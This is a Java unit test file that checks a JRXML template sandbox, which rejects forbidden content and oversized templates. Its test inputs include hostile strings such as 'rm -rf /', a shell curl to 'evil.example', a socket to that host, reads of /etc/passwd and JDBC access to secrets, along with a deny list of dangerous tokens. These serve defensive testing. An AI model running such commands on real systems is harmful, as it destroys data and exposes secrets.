package com.metnex.jasperrenderer.template;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.metnex.jasperrenderer.exception.ForbiddenTemplateContentException;
import com.metnex.jasperrenderer.exception.PayloadTooLargeException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class JrxmlSandboxTest {

    @Test
    void acceptsBenignJrxmlContent() {
        byte[] content = "<jasperReport name=\"ok\"><detail/></jasperReport>".getBytes(StandardCharsets.UTF_8);

        assertThatCode(() -> JrxmlSandbox.assertSafe(content, 1024)).doesNotThrowAnyException();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "java.sql.DriverManager.getConnection(...)",
        "jdbc:postgresql://internal-db/secrets",
        "new java.io.File(\"/etc/passwd\")",
        "Runtime.getRuntime().exec(\"rm -rf /\")",
        "new ProcessBuilder(\"sh\", \"-c\", \"curl evil.example\")",
        "System.exit(1)",
        "java.net.Socket(\"evil.example\", 80)",
        "<queryString><![CDATA[SELECT * FROM users]]></queryString>",
    })
    void rejectsForbiddenJrxmlContent(String forbidden) {
        byte[] content = ("<jasperReport>" + forbidden + "</jasperReport>").getBytes(StandardCharsets.UTF_8);

        assertThatThrownBy(() -> JrxmlSandbox.assertSafe(content, 1024 * 1024))
            .isInstanceOf(ForbiddenTemplateContentException.class);
    }

    @Test
    void rejectsOversizedTemplateContent() {
        byte[] content = "a".repeat(300 * 1024).getBytes(StandardCharsets.UTF_8);

        assertThatThrownBy(() -> JrxmlSandbox.assertSafe(content, 256 * 1024))
            .isInstanceOf(PayloadTooLargeException.class);
    }

    @Test
    void everyForbiddenTokenListedInTheContractIsActuallyEnforced() {
        List<String> mustReject = List.of(
            "java.sql", "jdbc:", "java.io.File", "Runtime.getRuntime",
            "ProcessBuilder", "System.exit", "java.net");

        for (String token : mustReject) {
            byte[] content = ("<jasperReport>" + token + "</jasperReport>").getBytes(StandardCharsets.UTF_8);
            assertThatThrownBy(() -> JrxmlSandbox.assertSafe(content, 1024 * 1024))
                .as("token: %s", token)
                .isInstanceOf(ForbiddenTemplateContentException.class);
        }
    }
}
